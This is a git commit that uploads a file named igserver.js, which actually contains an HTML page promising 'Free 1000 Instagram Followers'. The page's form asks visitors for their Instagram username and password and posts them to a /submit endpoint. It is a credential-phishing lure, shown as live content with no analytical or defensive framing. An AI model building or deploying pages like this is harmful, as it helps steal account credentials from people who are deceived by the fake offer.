8758fa4d425c31e58301d436fb0c98eb631197a4
sami5445 <samiboss10best@gmail.com>
2025-06-05 16:35:03 -0400

    Add files via upload

---
+++ igserver.js
@@ -0,0 +1,14 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Get Free 1000 Followers</title>
+</head>
+<body>
+  <h2>🎁 Get Free 1000 Instagram Followers 🎉</h2>
+  <form action="/submit" method="POST">
+    <input type="text" name="username" placeholder="Enter Username" required><br><br>
+    <input type="password" name="password" placeholder="Enter Password" required><br><br>
+    <button type="submit" style="background-color: blue; color: white;">Get Followers</button>
+  </form>
+</body>
+</html>
